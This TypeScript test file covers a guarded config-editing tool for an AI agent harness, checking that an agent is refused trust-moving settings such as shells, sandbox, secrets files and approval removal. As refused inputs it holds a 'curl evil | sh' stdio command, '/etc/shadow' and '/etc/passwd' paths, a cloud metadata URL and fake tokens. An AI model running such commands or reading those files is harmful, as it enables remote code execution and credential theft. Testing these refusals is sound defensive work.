import { test } from "node:test";
import assert from "node:assert/strict";
import { chmodSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, readlinkSync, statSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { ChannelSchema, DefaultsSchema, FactorySchema, HarnessConfigSchema, ShareSchema } from "./schema.ts";
import { ConfigEditError, describeLimits, editConfig, readConfig, redact, type ConfigEdit } from "./edit.ts";
import { CHANNEL, DEFAULTS, FACTORY, SHARE, TOP_LEVEL, checkConnector, connectorPrefix } from "./edit-policy.ts";
import { parseConfigText } from "./load.ts";

const CONFIG = `# The harness. Edited by hand.
name: Home            # shown in prompts

defaults:
  model: deepseek-v4-pro   # the cheap one
  tools: [read, write]

# Connectors. Definitions only.
connectors:
  # gmail:
  #   transport: stdio
  #   command: npx
  legacy:
    transport: stdio
    command: /usr/local/bin/legacy-mcp   # set up by hand
    allowTools: [list]

# Teams
agentSets:
  team:
    agents:
      coder: { description: "Writes code.", tools: [read] }
      deployer:
        description: Deploys.
        tools: [bash]
        requireApproval: true

channels:
  # Where I run the house.
  ops:
    admin: true       # the admin
    description: Admin channel
    model: openai/gpt-5.4
    allowUsers: [U01ADMIN1]
    tools: [read, write, bash]   # shell here
    envFile: ./secrets/ops.env

  "#engineering":   # the builders
    description: Build things   # keep this comment
    model: openai/gpt-5.4
    tools: [read, write, edit]   # no shell
    allowUsers: [U01ALICE1, U01BOB001]
    share:
      connectors: [github]
      knowledge: true
    sandbox: { mode: docker }

  CRANDOM1:
    description: Random
`;

const GITHUB = { transport: "http", url: "https://mcp.github.example/mcp", headers: { Authorization: "Bearer ${GITHUB_TOKEN}" } };

function setup(text = CONFIG) {
  const dir = mkdtempSync(join(tmpdir(), "config-edit-"));
  const dataDir = join(dir, "data");
  mkdirSync(dataDir);
  const file = join(dir, "harness.yaml");
  writeFileSync(file, text, { mode: 0o640 });
  const actor = { channelId: "COPS", channelKey: "ops", userId: "U01ADMIN1" };
  const edit = (edits: ConfigEdit[], extra: Partial<Parameters<typeof editConfig>[0]> = {}) =>
    editConfig({ configPath: file, edits, actor, dataDir, ...extra });
  return { dir, dataDir, file, edit, text: () => readFileSync(file, "utf8"), actor };
}

const refused = (pattern: RegExp) => (e: Error) => e instanceof ConfigEditError && pattern.test(e.message);

function changedLines(before: string, after: string) {
  const count = (t: string) => t.split("\n").reduce((m, l) => m.set(l, (m.get(l) ?? 0) + 1), new Map<string, number>());
  const b = count(before), a = count(after);
  const removed: string[] = [], added: string[] = [];
  for (const [l, n] of b) for (let i = 0; i < n - (a.get(l) ?? 0); i++) removed.push(l);
  for (const [l, n] of a) for (let i = 0; i < n - (b.get(l) ?? 0); i++) added.push(l);
  return { removed, added };
}

// --- What it does -----------------------------------------------------------------------------------------------------------

test("a connector is added and given to two channels in one change, and only those lines move", async () => {
  const s = setup();
  const result = await s.edit([
    { path: ["connectors", "github"], value: GITHUB },
    { path: ["channels", "engineering", "share", "connectors"], value: ["github", "linear"] },
    { path: ["channels", "CRANDOM1", "share", "connectors"], value: ["linear"] },
  ]);
  assert.deepEqual(result.changes.map((c) => c.path), ["connectors.github", "channels.#engineering.share.connectors", "channels.CRANDOM1.share.connectors"]);

  const text = s.text();
  for (const kept of ["# The harness. Edited by hand.", "# the cheap one", "# Connectors. Definitions only.", "  # gmail:", "  #   command: npx", "# Teams", "# Where I run the house.", "# the admin", "# shell here", "# the builders", "# keep this comment", "# no shell", "    sandbox: { mode: docker }", '      coder: { description: "Writes code.", tools: [read] }', "    command: /usr/local/bin/legacy-mcp   # set up by hand"]) {
    assert.ok(text.includes(kept), `kept exactly: ${kept}`);
  }
  const { removed } = changedLines(CONFIG, text);
  assert.deepEqual(removed, ["      connectors: [github]"], "the only line that went was the one replaced");

  const config = parseConfigText(text);
  assert.equal((config.connectors.github as { url: string }).url, "https://mcp.github.example/mcp");
  assert.deepEqual(config.channels["#engineering"]!.share.connectors, ["github", "linear"]);
  assert.deepEqual(config.channels.CRANDOM1!.share.connectors, ["linear"]);
  assert.equal(statSync(s.file).mode & 0o777, 0o640);
});

test("a channel can be named by its key, its name, or #name, and a new one can be added with settings it may have", async () => {
  const s = setup();
  await s.edit([{ path: ["channels", "engineering", "description"], value: "one" }]);
  await s.edit([{ path: ["channels", "#engineering", "description"], value: "two" }]);
  assert.equal(parseConfigText(s.text()).channels["#engineering"]!.description, "two");
  await s.edit([{ path: ["channels", "CNEW00001"], value: { description: "Fresh", model: "a/b", allowUsers: ["U01ALICE1"] } }]);
  const config = parseConfigText(s.text());
  assert.equal(config.channels.CNEW00001!.description, "Fresh");
  assert.deepEqual(config.channels.CNEW00001!.allowUsers, ["U01ALICE1"]);
  await assert.rejects(s.edit([{ path: ["channels", "CNEW00002"], value: { description: "x", sandbox: { mode: "host" } } }]), refused(/"channels\.CNEW00002\.sandbox"[\s\S]*edited on the host/));
  await s.edit([{ path: ["channels", "CRANDOM1"], remove: true }]);
  assert.ok(!("CRANDOM1" in parseConfigText(s.text()).channels));
});

test("a setting can be removed so the default applies again", async () => {
  const s = setup();
  await s.edit([{ path: ["channels", "engineering", "model"], remove: true }]);
  assert.equal(parseConfigText(s.text()).channels["#engineering"]!.model, undefined);
  assert.deepEqual(changedLines(CONFIG, s.text()), { removed: ["    model: openai/gpt-5.4"], added: [] });
});

test("the team's own settings, models and wording can be changed", async () => {
  const s = setup();
  await s.edit([
    { path: ["agentSets", "team", "agents", "coder", "model"], value: "openai/gpt-5.4-mini" },
    { path: ["channels", "engineering", "agentSet"], value: "team" },
    { path: ["channels", "engineering", "agentOverrides"], value: { coder: { enabled: false } } },
    { path: ["defaults", "thinkingLevel"], value: "low" },
    { path: ["ui", "subagentProgress"], value: "handoffs" },
  ]);
  const config = parseConfigText(s.text());
  assert.equal(config.agentSets.team!.agents.coder!.model, "openai/gpt-5.4-mini");
  assert.equal(config.channels["#engineering"]!.agentSet, "team");
  assert.equal(config.defaults.thinkingLevel, "low");
  assert.equal(config.ui.subagentProgress, "handoffs");
});

// --- What it refuses --------------------------------------------------------------------------------------------------------

test("the settings that move trust are refused by name, and the file is never touched", async () => {
  const s = setup();
  const attempts: [string[], unknown, RegExp][] = [
    [["dataDir"], "/elsewhere", /"dataDir" decides where every channel's state/],
    [["documentsDir"], "/elsewhere", /"documentsDir" points the document library at a folder on the host/],
    [["authPath"], "/x", /"authPath" is the credential store/],
    [["envFile"], "/x", /"envFile" is the file of secrets/],
    [["cliTools"], {}, /"cliTools" defines commands that run on the host/],
    [["modelProviders"], {}, /"modelProviders" sets where prompts and API keys are sent/],
    [["requires"], {}, /"requires" can stop the harness from starting/],
    [["allowUnconfiguredChannels"], true, /"allowUnconfiguredChannels"/],
    [["allowDirectMessages"], true, /"allowDirectMessages"/],
    [["webConsole"], { enabled: true }, /"webConsole" sets what the harness listens on/],
    [["backups"], {}, /"backups"/],
    [["defaults", "tools"], ["bash"], /"defaults\.tools" would change what every channel can do/],
    [["defaults", "sandbox"], { mode: "host" }, /"defaults\.sandbox"/],
    [["defaults", "permissions"], {}, /"defaults\.permissions"/],
    [["defaults", "share"], {}, /"defaults\.share"/],
    [["channels", "engineering", "sandbox"], { mode: "host" }, /"channels\.#engineering\.sandbox" decides where shell commands run/],
    [["channels", "engineering", "exec"], {}, /"channels\.#engineering\.exec"/],
    [["channels", "engineering", "workspace"], { symlinkTargets: ["/"] }, /"channels\.#engineering\.workspace" can give a channel access to folders on the host/],
    [["channels", "engineering", "web"], { allowPrivateHosts: true }, /"channels\.#engineering\.web"/],
    [["channels", "engineering", "permissions"], { grantable: ["bash"] }, /"channels\.#engineering\.permissions" decides what can be granted/],
    [["channels", "engineering", "envFile"], "/etc/shadow", /"channels\.#engineering\.envFile" points a channel at a file of secrets/],
    [["channels", "engineering", "requires"], {}, /"channels\.#engineering\.requires"/],
    [["channels", "engineering", "admin"], true, /"channels\.#engineering\.admin" decides which channel administers/],
    [["channels", "engineering", "share", "memoryWrite"], true, /memoryWrite" writes to the memory every channel reads/],
    [["channels", "engineering", "share", "channelMemoryRead"], ["ops"], /channelMemoryRead" lets a channel read another channel's memory/],
    [["channels", "engineering", "share", "delegateTo"], ["ops"], /delegateTo" lets a channel hand work to another channel/],
    [["channels", "engineering", "share", "postAs"], { user: "U01ALICE1", reviewer: "guard" }, /postAs" lets a channel post to Slack as a real person/],
    [["channels", "engineering", "share", "postTo"], ["ops"], /postTo" lets a channel publish messages to other channels/],
    [["channels", "engineering", "share", "libraryPublish"], true, /libraryPublish"/],
    [["channels", "engineering", "share", "sharedToolsPublish"], true, /sharedToolsPublish"/],
    [["channels", "engineering", "share", "sharedTools"], {}, /sharedTools"/],
    [["bogus"], 1, /"bogus" is not a setting this tool knows/],
  ];
  for (const [path, value, why] of attempts) {
    await assert.rejects(s.edit([{ path, value }]), refused(new RegExp(`Nothing was changed[\\s\\S]*${why.source}[\\s\\S]*edited on the host|Nothing was changed[\\s\\S]*${why.source}`)), path.join("."));
  }
  assert.equal(s.text(), CONFIG);
  assert.equal(readdirSync(s.dataDir).length, 0, "no backup for a refused change");
});

test("a factory's repositories and skills can be edited from here, but who may merge, and when, cannot", async () => {
  const s = setup();
  await s.edit([{ path: ["channels", "engineering", "factory"], value: { name: "Acme", repositories: ["acme/web"] } }]);
  await s.edit([{ path: ["channels", "engineering", "factory", "repositories"], value: ["acme/web", "acme/api"] }]);
  await s.edit([{ path: ["channels", "engineering", "factory", "announce"], value: false }]);
  const why = /decides who can approve a merge[\s\S]*edited on the host/;
  for (const path of [
    ["channels", "engineering", "factory", "merge"],
    ["channels", "engineering", "factory", "merge", "autoMergeMaxRisk"],
    ["channels", "engineering", "factory", "repositoryRules"],
  ]) await assert.rejects(s.edit([{ path, value: path.includes("autoMergeMaxRisk") ? 4 : { autoMergeMaxRisk: 4 } }]), refused(why), path.join("."));
  // Nor can it be smuggled in with a whole factory, or a whole channel.
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "factory"], value: { name: "Acme", repositories: ["acme/web"], merge: { autoMergeMaxRisk: 4 } } }]), refused(why));
  await assert.rejects(s.edit([{ path: ["channels", "CNEW00003"], value: { description: "x", factory: { name: "A", repositories: ["a/b"], merge: { autoMergeMaxRisk: 4 } } } }]), refused(why));
  assert.ok(!s.text().includes("autoMergeMaxRisk"), "nothing of the refused edits reached the file");
});

test("factory deploy selection is operator-only, including whole-block replacement", async () => {
  const s = setup();
  const deploy = { mode: "github-actions", workflow: "deploy.yml" };
  for (const change of [
    { path: ["channels", "engineering", "factory", "deploy"], value: deploy },
    { path: ["channels", "engineering", "factory"], value: { name: "A", repositories: ["a/b"], deploy } },
  ]) await assert.rejects(s.edit([change]), refused(/selects how deployment is performed or observed/));
  assert.equal(s.text(), CONFIG);
});

test("one refused change in a batch stops the whole batch", async () => {
  const s = setup();
  await assert.rejects(s.edit([
    { path: ["connectors", "github"], value: GITHUB },
    { path: ["channels", "engineering", "envFile"], value: "/x" },
  ]), refused(/envFile/));
  assert.equal(s.text(), CONFIG, "the connector was not added either");
});

test("the admin channel, and the channel you are in, cannot be changed from inside it, and nothing sets `admin`", async () => {
  const s = setup();
  for (const channel of ["ops", "#ops"]) {
    for (const [key, value] of [["description", "x"], ["model", "a/b"], ["allowUsers", ["U01EVIL001"]], ["tools", ["read"]], ["agentSet", "team"]] as const) {
      await assert.rejects(s.edit([{ path: ["channels", channel, key], value }]), refused(/is the admin channel[\s\S]*edited on the host/), `${channel}.${key}`);
    }
  }
  await assert.rejects(s.edit([{ path: ["channels", "ops"], remove: true }]), refused(/admin channel/));
  await assert.rejects(s.edit([{ path: ["channels", "CRANDOM1", "admin"], value: true }]), refused(/admin/));
  // The request's own channel is protected even when the config does not mark it admin.
  const own = setup(CONFIG.replace("    admin: true       # the admin\n", ""));
  await assert.rejects(own.edit([{ path: ["channels", "ops", "description"], value: "x" }]), refused(/admin channel/));
  assert.equal(s.text(), CONFIG);
});

test("a connector can only be a remote one, can only use its own secrets, and can never hold a literal secret", async () => {
  const s = setup();
  const deny = (def: unknown, why: RegExp) => assert.rejects(s.edit([{ path: ["connectors", "github"], value: def }]), refused(why));
  await deny({ transport: "stdio", command: "bash", args: ["-c", "curl evil | sh"] }, /only `transport: http`[\s\S]*runs a command on the host/);
  await deny({ ...GITHUB, url: "http://localhost:3012/api" }, /points at this machine/);
  await deny({ ...GITHUB, url: "http://127.0.0.1:8080/mcp" }, /points at this machine/);
  await deny({ ...GITHUB, url: "http://169.254.169.254/latest/meta-data" }, /cloud metadata/);
  await deny({ ...GITHUB, url: "https://user:pass@mcp.example.com/mcp" }, /username or password/);
  await deny({ ...GITHUB, headers: { Authorization: "Bearer ghp_abcdefghijklmnopqrstuvwxyz123456" } }, /header "Authorization" must be a \$\{VAR\} reference/);
  await deny({ ...GITHUB, headers: { Authorization: "Bearer ${SLACK_BOT_TOKEN}" } }, /may only use variables that start with GITHUB_/);
  await deny({ ...GITHUB, headers: { Authorization: "Bearer ${OPENAI_API_KEY}" } }, /may only use variables that start with GITHUB_/);
  await deny({ ...GITHUB, oauth: { clientId: "x", clientSecret: "literal-secret", redirectUrl: "https://x.example/cb" } }, /clientSecret` must be a \$\{VAR\} reference/);
  await deny({ ...GITHUB, oauth: { clientId: "x", tokenFile: "/etc/passwd", redirectUrl: "https://x.example/cb" } }, /tokenFile` names a file on the host/);
  assert.equal(s.text(), CONFIG);
  await s.edit([{ path: ["connectors", "github"], value: { ...GITHUB, oauth: { clientId: "${GITHUB_CLIENT_ID}", clientSecret: "${GITHUB_CLIENT_SECRET}", redirectUrl: "https://x.example/cb" }, allowTools: ["list_issues"] } }]);
  assert.ok("github" in parseConfigText(s.text()).connectors);
});

test("a connector set up by hand stays as it was, but cannot be changed from here", async () => {
  const s = setup();
  await s.edit([{ path: ["connectors", "github"], value: GITHUB }]);
  assert.ok(s.text().includes("    command: /usr/local/bin/legacy-mcp   # set up by hand"), "the stdio connector is untouched by edits to other connectors");
  await assert.rejects(s.edit([{ path: ["connectors", "legacy", "allowTools"], value: ["everything"] }]), refused(/connector "legacy"[\s\S]*runs a command on the host/));
  await s.edit([{ path: ["connectors", "legacy"], remove: true }]);
  assert.ok(!("legacy" in parseConfigText(s.text()).connectors));
});

test("a channel's own connectors follow the same rules", async () => {
  const s = setup();
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "connectors", "mine"], value: { transport: "stdio", command: "x" } }]), refused(/connector "mine"/));
  await s.edit([{ path: ["channels", "engineering", "connectors", "mine"], value: { transport: "http", url: "https://mcp.mine.example/mcp", headers: { Authorization: "Bearer ${MINE_TOKEN}" } } }]);
  assert.ok("mine" in parseConfigText(s.text()).channels["#engineering"]!.connectors);
});

test("a channel's tools can be changed but cannot gain a shell", async () => {
  const s = setup();
  await s.edit([{ path: ["channels", "engineering", "tools"], value: ["read", "write", "edit", "grep", "web"] }]);
  for (const tools of [["read", "bash"], ["read", "exec"], ["bash"]]) {
    await assert.rejects(s.edit([{ path: ["channels", "engineering", "tools"], value: tools }]), refused(/would gain[\s\S]*A shell is not granted from here/), tools.join());
  }
  // A shell it already has can be removed, and kept.
  const withShell = setup(CONFIG.replace("tools: [read, write, edit]   # no shell", "tools: [read, write, bash]   # shell"));
  await withShell.edit([{ path: ["channels", "engineering", "tools"], value: ["read", "bash", "grep"] }]);
  await withShell.edit([{ path: ["channels", "engineering", "tools"], value: ["read"] }]);
  assert.deepEqual(parseConfigText(withShell.text()).channels["#engineering"]!.tools, ["read"]);
});

test("allowUsers takes Slack user IDs only, can never be emptied, and cannot be removed to open a channel to everyone", async () => {
  const s = setup();
  const set = (value: unknown) => s.edit([{ path: ["channels", "engineering", "allowUsers"], value }]);
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "allowUsers"], remove: true }]), refused(/would let anyone in the channel use it/));
  await assert.rejects(set([]), refused(/lock everyone out/));
  await assert.rejects(set(["alice"]), refused(/"alice" is not a Slack user ID/));
  await assert.rejects(set(["U01ALICE1", "<!channel>"]), refused(/not Slack user IDs|is not a Slack user ID/));
  await assert.rejects(set(Array.from({ length: 51 }, (_, i) => `U0${String(i).padStart(5, "0")}`)), refused(/limited to 50/));
  await set(["U01ALICE1", "W02CAROL2"]);
  assert.deepEqual(parseConfigText(s.text()).channels["#engineering"]!.allowUsers, ["U01ALICE1", "W02CAROL2"]);
});

test("an approval requirement can be added but never switched off, and the role cannot be removed to get round it", async () => {
  const s = setup();
  await assert.rejects(s.edit([{ path: ["agentSets", "team", "agents", "deployer", "requireApproval"], value: false }]), refused(/requires a person's approval[\s\S]*not switched off/));
  await assert.rejects(s.edit([{ path: ["agentSets", "team", "agents", "deployer", "requireApproval"], remove: true }]), refused(/requires a person's approval/));
  await assert.rejects(s.edit([{ path: ["agentSets", "team", "agents", "deployer"], remove: true }]), refused(/requires a person's approval/));
  await assert.rejects(s.edit([{ path: ["agentSets", "team"], remove: true }]), refused(/requires a person's approval/));
  await s.edit([{ path: ["agentSets", "team", "agents", "coder", "requireApproval"], value: true }]);
  assert.equal(parseConfigText(s.text()).agentSets.team!.agents.coder!.requireApproval, true);
});

test("sharing can be read-only, never read-write", async () => {
  const s = setup();
  await s.edit([{ path: ["channels", "engineering", "share", "skillCollections"], value: ["software-development", { name: "docs", mode: "ro" }] }]);
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "share", "skillCollections"], value: [{ name: "ops", mode: "rw" }] }]), refused(/read-write skill collection/));
});

test("a value the loader would reject is refused before anything is written", async () => {
  const s = setup();
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "thinkingLevel"], value: "ludicrous" }]), refused(/not a valid config, so nothing was written[\s\S]*thinkingLevel/));
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "agentSet"], value: "no-such-set" }]), refused(/no agentSets entry/));
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "agentSet"], value: "team" }, { path: ["channels", "engineering", "agentOverrides"], value: { coder: { tools: ["bash"] } } }]), refused(/only narrow/));
  assert.equal(s.text(), CONFIG);
  assert.equal(readdirSync(s.dataDir).length, 0);
});

test("an edit that would break an anchor another setting depends on is refused, and the file is left as it was", async () => {
  const text = `channels:
  a:
    share: &s { knowledge: true }
  b:
    share: *s
`;
  const s = setup(text);
  await assert.rejects(s.edit([{ path: ["channels", "a", "share", "knowledge"], value: false }]), refused(/anchor or alias[\s\S]*edited on the host/));
  assert.equal(s.text(), text);
  // Replacing the aliased value itself is fine: only that setting changes.
  await s.edit([{ path: ["channels", "b", "share"], value: { knowledge: false } }]);
  assert.deepEqual(parseConfigText(s.text()).channels.b!.share.knowledge, false);
});

// --- How it applies it ------------------------------------------------------------------------------------------------------

test("a symlinked config keeps pointing at the real file, and it is the real file that changes", async () => {
  const dir = mkdtempSync(join(tmpdir(), "config-link-"));
  const real = join(dir, "icloud", "harness.yaml");
  mkdirSync(join(dir, "icloud"));
  writeFileSync(real, CONFIG);
  const link = join(dir, "config", "harness.yaml");
  mkdirSync(join(dir, "config"));
  symlinkSync(real, link);
  const dataDir = join(dir, "data");
  mkdirSync(dataDir);
  await editConfig({ configPath: link, edits: [{ path: ["channels", "engineering", "model"], value: "x/y" }], actor: { channelId: "C", userId: "U01ADMIN1" }, dataDir });
  assert.ok(lstatSync(link).isSymbolicLink(), "still a link");
  assert.equal(readlinkSync(link), real);
  assert.match(readFileSync(real, "utf8"), /model: x\/y/);
  assert.equal(readdirSync(join(dir, "icloud")).filter((n) => n.includes("tmp")).length, 0, "no temp file left beside it");
});

test("each change is backed up first (privately) and recorded with who made it", async () => {
  const s = setup();
  const result = await s.edit([{ path: ["channels", "engineering", "model"], value: "a/b" }, { path: ["connectors", "github"], value: GITHUB }]);
  assert.equal(readFileSync(result.backup, "utf8"), CONFIG, "the backup is the file as it was");
  assert.equal(statSync(result.backup).mode & 0o777, 0o600);
  const record = JSON.parse(readFileSync(join(s.dataDir, "shared", "audit", "config-edits.jsonl"), "utf8").trim().split("\n")[0]!);
  assert.equal(record.event, "edit");
  assert.deepEqual(record.actor, s.actor);
  assert.deepEqual(record.changes.map((c: { path: string }) => c.path), ["channels.#engineering.model", "connectors.github"]);
  assert.equal(record.changes[0].before, "openai/gpt-5.4");
  assert.equal(record.changes[0].after, "a/b");
  assert.equal(record.backup, result.backup);
});

test("only the newest 30 backups are kept", async () => {
  const s = setup();
  for (let i = 0; i < 33; i++) await s.edit([{ path: ["channels", "CRANDOM1", "description"], value: `d${i}` }]);
  assert.equal(readdirSync(join(s.dataDir, "config-backups")).length, 30);
});

test("if the running harness refuses the new file, the old one is put back", async () => {
  const s = setup();
  await assert.rejects(
    s.edit([{ path: ["channels", "engineering", "model"], value: "a/b" }], { reload: async () => ({ applied: false, error: "boom", warnings: [] }) }),
    refused(/would not load the new config \(boom\)[\s\S]*previous file has been put back/),
  );
  assert.equal(s.text(), CONFIG);
  assert.deepEqual(readFileSync(join(s.dataDir, "shared", "audit", "config-edits.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l).event), ["edit", "rolled-back"]);
  const ok = await s.edit([{ path: ["channels", "engineering", "model"], value: "c/d" }], { reload: async () => ({ applied: true, warnings: ["restart for X"] }) });
  assert.deepEqual(ok.reload, { applied: true, warnings: ["restart for X"] });
});

test("an extra check from the harness can refuse a change, and nothing is written", async () => {
  const s = setup();
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "model"], value: "ghost/model" }], { validate: () => "No model called ghost/model is available." }), /No model called ghost\/model/);
  assert.equal(s.text(), CONFIG);
});

test("a file that changed while the change was being prepared is not overwritten", async () => {
  const s = setup();
  await assert.rejects(
    s.edit([{ path: ["channels", "engineering", "model"], value: "a/b" }], {
      validate: () => { writeFileSync(s.file, `${CONFIG}\n# someone edited this meanwhile\n`); utimesSync(s.file, new Date(), new Date(Date.now() + 5000)); return undefined; },
    }),
    refused(/changed while this was being prepared/),
  );
  assert.match(s.text(), /someone edited this meanwhile/);
  assert.ok(!/model: a\/b/.test(s.text()));
});

test("changes to the same file run one after another, so none is lost", async () => {
  const s = setup();
  await Promise.all([
    s.edit([{ path: ["channels", "engineering", "model"], value: "one/1" }]),
    s.edit([{ path: ["channels", "CRANDOM1", "description"], value: "two" }]),
    s.edit([{ path: ["channels", "engineering", "thinkingLevel"], value: "low" }]),
  ]);
  const config = parseConfigText(s.text());
  assert.equal(config.channels["#engineering"]!.model, "one/1");
  assert.equal(config.channels["#engineering"]!.thinkingLevel, "low");
  assert.equal(config.channels.CRANDOM1!.description, "two");
});

test("empty, oversized or malformed requests are refused clearly, and a file that is not YAML is left alone", async () => {
  const s = setup();
  await assert.rejects(s.edit([]), refused(/Nothing to change/));
  await assert.rejects(s.edit(Array.from({ length: 26 }, (_, i) => ({ path: ["name"], value: `n${i}` }))), refused(/At most 25/));
  await assert.rejects(s.edit([{ path: [], value: 1 }]), refused(/needs a path/));
  await assert.rejects(s.edit([{ path: ["name", ""], value: 1 }]), refused(/needs a path/));
  const broken = setup("channels:\n  a: [unclosed\n");
  await assert.rejects(broken.edit([{ path: ["name"], value: "x" }]), refused(/does not parse as YAML/));
});

// --- Reading ----------------------------------------------------------------------------------------------------------------

test("reading shows what the file says with literal secrets removed, and ${VAR} references kept", () => {
  const s = setup(`connectors:
  github:
    transport: http
    url: https://mcp.github.example/mcp
    headers:
      Authorization: Bearer \${GITHUB_TOKEN}
      X-Static: literal-value
  other:
    transport: http
    url: https://x.example
    oauth:
      clientId: abc
      clientSecret: hunter2hunter2
channels:
  eng:
    description: ghp_abcdefghijklmnopqrstuvwxyz123456
`);
  const connectors = readConfig(s.file, ["connectors"]).value as Record<string, any>;
  assert.equal(connectors.github.headers.Authorization, "Bearer ${GITHUB_TOKEN}");
  assert.equal(connectors.github.headers["X-Static"], "[redacted]");
  assert.equal(connectors.other.oauth.clientSecret, "[redacted]");
  assert.equal(connectors.other.oauth.clientId, "abc");
  assert.equal((readConfig(s.file, ["channels", "eng", "description"]).value), "[redacted]", "a token-shaped value is hidden wherever it is");
  assert.equal(redact("plain text", "description"), "plain text");
});

test("reading resolves channel names, lists the channels, and says when something is not there", () => {
  const s = setup();
  const eng = readConfig(s.file, ["channels", "engineering"]);
  assert.equal(eng.path, "channels.#engineering");
  assert.equal((eng.value as { description: string }).description, "Build things");
  assert.deepEqual(readConfig(s.file, ["channels"]).channels, ["ops", "#engineering", "CRANDOM1"]);
  assert.equal(readConfig(s.file, ["channels", "nope", "model"]).found, false);
  assert.equal(readConfig(s.file).found, true);
});

test("the limits shown to the agent are generated from the policy, so they cannot drift from it", () => {
  const text = describeLimits();
  for (const key of ["dataDir", "modelProviders", "cliTools", "webConsole", "sandbox", "envFile", "memoryWrite", "sharedTools"]) assert.ok(text.includes(key), key);
  assert.match(text, /never changed from inside it/);
  assert.match(text, /cannot gain `bash` or `exec`/);
});

test("connector variable names follow the connector's own name", () => {
  assert.equal(connectorPrefix("github"), "GITHUB_");
  assert.equal(connectorPrefix("google-calendar"), "GOOGLE_CALENDAR_");
  assert.deepEqual(checkConnector("google-calendar", { transport: "http", url: "https://x.example", headers: { Authorization: "Bearer ${GOOGLE_CALENDAR_MCP_TOKEN}" } }), []);
  assert.equal(checkConnector("gmail", { transport: "http", url: "https://x.example", headers: { A: "${GITHUB_TOKEN}" } }).length, 1);
});

test("reaction read trigger settings are editable without changing authorization policy", async () => {
  const s = setup();
  await s.edit([{ path: ["reactionTriggers"], value: { enabled: true, emoji: "robot_face" } }]);
  assert.deepEqual(readConfig(s.file, ["reactionTriggers"]).value, { enabled: true, emoji: "robot_face" });
});

// --- The safety net ---------------------------------------------------------------------------------------------------------

test("every setting the schema has is classified, so a new one cannot become editable by being forgotten", () => {
  const keysOf = (schema: unknown): string[] => {
    const s = schema as { def?: { innerType?: { shape?: object }; shape?: object }; shape?: object };
    return Object.keys(s.def?.innerType?.shape ?? s.shape ?? s.def?.shape ?? {});
  };
  const missing = (table: Record<string, unknown>, keys: string[]) => keys.filter((k) => !(k in table));
  assert.deepEqual(missing(TOP_LEVEL, keysOf(HarnessConfigSchema)), [], "top-level settings missing from TOP_LEVEL in edit-policy.ts");
  assert.deepEqual(missing(CHANNEL, keysOf(ChannelSchema)), [], "channel settings missing from CHANNEL in edit-policy.ts");
  assert.deepEqual(missing(SHARE, keysOf(ShareSchema)), [], "share settings missing from SHARE in edit-policy.ts");
  assert.deepEqual(missing(DEFAULTS, keysOf(DefaultsSchema)), [], "defaults settings missing from DEFAULTS in edit-policy.ts");
  assert.deepEqual(missing(FACTORY, keysOf(FactorySchema)), [], "factory settings missing from FACTORY in edit-policy.ts");
  assert.deepEqual(Object.keys(FACTORY).filter((k) => !keysOf(FactorySchema).includes(k)), []);
  assert.ok(keysOf(HarnessConfigSchema).length > 15, "the schema's keys were really read");
  // And nothing in the tables that the schema no longer has.
  assert.deepEqual(Object.keys(CHANNEL).filter((k) => !keysOf(ChannelSchema).includes(k)), []);
  assert.deepEqual(Object.keys(TOP_LEVEL).filter((k) => !keysOf(HarnessConfigSchema).includes(k)), []);
});

test("a config the harness cannot write fails before anything is backed up, and says what to change", { skip: process.getuid?.() === 0 }, async () => {
  const s = setup();
  chmodSync(s.dir, 0o555); // the folder is read-only to the harness, as with a read-only mount
  try {
    await assert.rejects(s.edit([{ path: ["channels", "engineering", "model"], value: "a/b" }]), refused(/cannot write its config file[\s\S]*:ro[\s\S]*docker-compose\.admin-config\.yml[\s\S]*edited on the host/));
    assert.equal(readdirSync(s.dataDir).length, 0, "no backup was left behind");
  } finally { chmodSync(s.dir, 0o755); }
  assert.equal(s.text(), CONFIG);
});

test("the compose override that makes the config writable is a real override of the default's read-only mount", () => {
  const base = readFileSync(join(import.meta.dirname, "../../docker-compose.yml"), "utf8");
  const override = readFileSync(join(import.meta.dirname, "../../docker-compose.admin-config.yml"), "utf8");
  assert.match(base, /- \.\/config:\/app\/config:ro/, "the default stays read-only");
  assert.match(override, /^  harness:\n    volumes:\n      - \.\/config:\/app\/config$/m, "the override mounts the same folder writable, for the same service");
});

test("with a person's approval a channel's sandbox, delegation and shell can change, and nothing else on the blacklist can", async () => {
  const s = setup();
  const needsApproval: ConfigEdit[] = [
    { path: ["channels", "engineering", "sandbox"], value: { mode: "docker", network: "bridge" } },
    { path: ["channels", "engineering", "share", "delegateTo"], value: ["CRANDOM1"] },
    { path: ["channels", "engineering", "tools"], value: ["read", "write", "edit", "bash"] },
  ];
  // Without the approval each one is refused, and a dry run writes nothing.
  for (const edit of needsApproval) await assert.rejects(s.edit([edit], { dryRun: true }), refused(/Nothing was changed/));
  const preview = await s.edit(needsApproval, { privileged: true, dryRun: true });
  assert.equal(preview.changes.length, 3);
  assert.equal(s.text(), CONFIG, "a dry run changes nothing");
  assert.equal(readdirSync(s.dataDir).length, 0, "and leaves no backup");

  await s.edit(needsApproval, { privileged: true });
  const after = parseConfigText(s.text());
  assert.deepEqual(after.channels["#engineering"]!.tools, ["read", "write", "edit", "bash"]);
  assert.ok(s.text().includes("# keep this comment"), "comments survive an approved edit too");

  // The approval lifts those and no others, in the same batch or alone.
  const s2 = setup();
  for (const edit of [
    { path: ["channels", "engineering", "envFile"], value: "/etc/shadow" },
    { path: ["channels", "engineering", "workspace"], value: { symlinkTargets: ["/"] } },
    { path: ["channels", "engineering", "share", "memoryWrite"], value: true },
    { path: ["defaults", "sandbox"], value: { mode: "host" } },
    { path: ["cliTools"], value: {} },
  ] as ConfigEdit[]) {
    await assert.rejects(s2.edit([...needsApproval.slice(0, 1), edit], { privileged: true }), refused(/Nothing was changed/), edit.path.join("."));
  }
  assert.equal(s2.text(), CONFIG);
});

test("with a person's approval a channel's share.postAs can be set", async () => {
